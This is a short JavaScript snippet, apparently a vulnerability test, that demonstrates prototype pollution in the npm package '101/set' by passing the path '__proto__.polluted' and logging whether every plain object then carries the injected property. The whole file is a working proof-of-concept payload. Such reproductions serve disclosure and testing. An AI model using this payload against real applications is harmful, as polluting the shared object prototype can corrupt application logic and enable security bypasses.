// test("prototype pollution in 101/set", () => {
console.log({}.polluted);

  const _101 = require("101/set");
  // console.log(_101)
  _101({}, "__proto__.polluted", "yes");

console.log({}.polluted);
// });
